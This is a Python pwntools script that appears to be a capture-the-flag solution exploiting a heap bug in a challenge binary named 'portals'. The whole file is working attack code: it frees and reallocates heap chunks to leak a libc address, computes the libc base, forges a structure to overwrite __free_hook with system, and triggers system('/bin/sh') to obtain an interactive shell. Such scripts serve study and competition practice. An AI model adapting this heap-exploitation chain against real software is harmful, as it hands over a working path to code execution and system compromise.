#!/usr/bin/env python3

from pwn import *

exe = ELF("./portals")
libc = ELF("./libc.so.6")

context.binary = exe

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'debug'
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 1024)

    return r

def make_portal(r, year):
    r.sendline("o")
    assert len(str(year)) < 6
    r.sendline(str(year))

def close_portal(r, year):
    r.sendline("c")
    assert len(str(year)) < 6
    r.sendline(str(year))

def take_portal(r, year):
    r.sendline("t")
    assert len(str(year)) < 6
    r.sendline(str(year))

def leave_note(r, note, note_len=16):
    r.sendline('m')
    rounded_up = ( note_len+15 ) // 16
    r.sendline(str(rounded_up))
    r.sendline(note.ljust(rounded_up-1, b" ")) # This pads with spaces right now...

def modify_note(r, note):
    r.sendline('m')
    r.sendline(note)

def leave_note_exploit(r, note_len=16):
    r.sendline('m')
    rounded_up = ( note_len+15 ) // 16 # This does nothing for 16-byte-aligned sizes
    r.sendline(str(rounded_up))
    r.sendline()

def forge_tp(num_links, target):
    tp = b''
    tp += p64(1337)
    tp += p64(0) * num_links
    tp += p64(8)
    tp += p64(target)
    return tp

def main():
    r = conn()

    alloc_size = 0x800 # 0x20 allocations also work, but you'll get a heap address and you'll lose 2 low bytes
    # good luck pwning :)
    make_portal(r, 2069)
    take_portal(r, 2069)
    leave_note(r, b"lol i love potatoes", note_len=alloc_size)
    make_portal(r, 2022)
    take_portal(r, 2022)

    make_portal(r, 420)
    take_portal(r, 420)
    leave_note(r, b"dummy allocation to prevent consolidation", note_len=0x60)
    make_portal(r, 2022)
    take_portal(r, 2022)

    make_portal(r, 2071) # Make our portal, which we will take momentarily
                         # NOTE: This actually has to happen before freeing the chunk, because unsorted bin chunks do not stick around for long

    # make_portal(r, 2070)
    # take_portal(r, 2070)
    # leave_note(r, b"lol i love potatoes", note_len=alloc_size)
    # make_portal(r, 2022)
    # take_portal(r, 2022)

    close_portal(r, 2069) # Frees the first potato chunk
    # close_portal(r, 2070) # Frees the second potato chunk

    take_portal(r, 2071)
    leave_note_exploit(r, note_len=alloc_size) # lol they got consolidated

    r.recvuntil("The year is 2071.\nSomebody left notes on the ground. They say:\n\n")
    data = r.recvline()
    leak = u64(data[7:15])
    print(f"Libc leak: {hex(leak)}")
    leak_offset = 0x1ecb80 + 96
    libc.address = leak - leak_offset
    print(f"Libc base: {hex(libc.address)}")

    r.recvuntil("What will you do?")

    make_portal(r, 1)
    take_portal(r, 1)

    make_portal(r, 2)
    make_portal(r, 3)
    take_portal(r, 3)

    make_portal(r, 1)
    make_portal(r, 2)
    close_portal(r, 2)
    take_portal(r, 1)

    leave_note(r, forge_tp(5, libc.symbols.__free_hook), note_len=64)
    r.sendline() # idk why
    take_portal(r, 1337) # formerly 2
    modify_note(r, p64(libc.symbols.system))
    r.sendline() # idk why

    make_portal(r, 420)
    take_portal(r, 420)
    modify_note(r, b"/bin/sh\x00")
    take_portal(r, 2022)
    close_portal(r, 420)

    r.interactive()


if __name__ == "__main__":
    main()
